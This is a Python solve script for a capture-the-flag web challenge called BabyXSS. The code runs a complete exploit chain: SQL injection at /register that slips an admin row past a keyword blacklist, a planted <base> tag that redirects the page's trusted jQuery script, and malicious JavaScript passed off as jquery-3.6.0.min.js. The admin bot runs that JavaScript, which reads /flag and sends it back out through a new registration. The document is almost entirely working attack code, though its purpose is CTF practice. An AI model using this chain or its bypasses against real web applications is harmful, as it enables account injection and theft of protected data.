#!/usr/bin/env python3
"""BabyXSS (DASCTF WEB-04) — full chain.

SQLi at /register -> admin row with <base> payload -> bot's nonce'd jQuery
<script> tag loads our JS from our LAN host -> JS (same-origin) reads /flag
and stores it back via /register -> we log in as the exfil user and read it.

Usage:
  python3 solve.py --target http://<challenge-ip>:<port> --host <our-ip-reachable-from-challenge> [--port 9000] [--app-origin http://127.0.0.1:8080]

Requires: requests
"""
import argparse
import functools
import os
import random
import re
import string
import tempfile
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

import requests

HEX_JS = """fetch('{app_origin}/flag').then(r=>r.text()).then(t=>{{
  var h=t.split('').map(c=>c.charCodeAt(0).toString(16)).join('-');
  fetch('{app_origin}/register',{{method:'POST',
    headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
    body:'username={exfil_user}&password=abc&bio='+encodeURIComponent(h)}});
}});
"""


def rand(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def serve_js(port, js):
    root = tempfile.mkdtemp()
    os.makedirs(f'{root}/static', exist_ok=True)
    with open(f'{root}/static/jquery-3.6.0.min.js', 'w') as f:
        f.write(js)
    httpd = HTTPServer(('0.0.0.0', port), functools.partial(SimpleHTTPRequestHandler, directory=root))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()


def register(s, target, username, password, bio):
    r = s.post(f'{target}/register', data={'username': username, 'password': password, 'bio': bio},
               allow_redirects=True, timeout=15)
    if '用户注册成功' in r.text:
        return 'ok'
    if '用户注册失败' in r.text:
        return 'fail'          # e.g. UNIQUE collision
    return 'blocked'           # '含有非法关键字'


def profile_id_after_login(target, username, password):
    s = requests.Session()
    r = s.post(f'{target}/login', data={'username': username, 'password': password},
               allow_redirects=False, timeout=15)
    m = re.search(r'/profile/(\d+)', r.headers.get('Location', ''))
    return int(m.group(1)) if m else None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--target', required=True, help='challenge base URL, e.g. http://10.0.0.5:8080')
    ap.add_argument('--host', required=True, help='our IP reachable FROM the challenge container')
    ap.add_argument('--port', type=int, default=9000, help='our JS hosting port')
    ap.add_argument('--app-origin', default='http://127.0.0.1:8080',
                    help="app origin as seen by the bot (bot.py uses 127.0.0.1:8080)")
    args = ap.parse_args()
    target = args.target.rstrip('/')

    exfil_user = 'exf' + rand(6)
    requests.get(target + '/', timeout=10)

    # 1) SQLi: VALUES ('<user>','p','x'), (char(97,100,109,105,110),'p','<base payload>').
    #    password 'p' fails Length(min=6) -> form.validate() False -> the "invalid keyword"
    #    branch is skipped and the raw f-string INSERT runs. 'admin' spelled via char()
    #    to pass the blacklist. Next autoincrement id carries the admin row.
    user1 = 'u' + rand(6)
    base_payload = f'</p><base href="http://{args.host}:{args.port}/">'
    sqli_bio = "x'), (char(97,100,109,105,110), 'p', '" + base_payload.replace("'", "''") + "') -- "
    res = register(requests.Session(), target, user1, 'p', sqli_bio)
    print('[1] sqli register ->', res)
    assert res == 'ok', 'SQLi insert failed (admin row may already exist)'

    # 2) locate admin row: login (no validation) as user1 -> id N -> admin = N+1
    uid = profile_id_after_login(target, user1, 'p')
    print('[2] anchor id =', uid)
    assert uid is not None, 'login as anchor user failed'
    admin_id = uid + 1
    prof = requests.get(f'{target}/profile/{admin_id}', timeout=10).text
    print('[2] admin id =', admin_id, '| raw <base> rendered:', '<base href' in prof)
    assert '<base href' in prof, 'admin row bio not rendered |safe'

    # 3) serve exfil JS; the <base> rewrite makes the page's nonce'd jQuery tag
    #    request http://<host>:<port>/static/jquery-3.6.0.min.js (same path)
    js = HEX_JS.format(app_origin=args.app_origin, exfil_user=exfil_user)
    serve_js(args.port, js)
    print('[3] serving exfil JS on 0.0.0.0:%d as /static/jquery-3.6.0.min.js' % args.port)

    # 4) trigger the bot (os.system blocks until the browser closes, ~5-20s)
    r = requests.get(f'{target}/report/{admin_id}', timeout=90)
    print('[4] /report ->', r.status_code, r.text[:40])

    # 5) read the exfil row via login (login has no validation either)
    exfil_id = profile_id_after_login(target, exfil_user, 'abc')
    print('[5] exfil id =', exfil_id)
    if exfil_id is None:
        print('[!] no exfil row — bot failed to fetch our JS or to store; see failure branches')
        return
    page = requests.get(f'{target}/profile/{exfil_id}', timeout=10).text
    m = re.search(r'个人简介:\s*([0-9a-f-]+)\s*<', page)
    if not m:
        print('[!] exfil bio not found; page:\n', page[:800])
        return
    flag = ''.join(chr(int(x, 16)) for x in m.group(1).split('-'))
    print('[FLAG]', flag.strip())


if __name__ == '__main__':
    main()
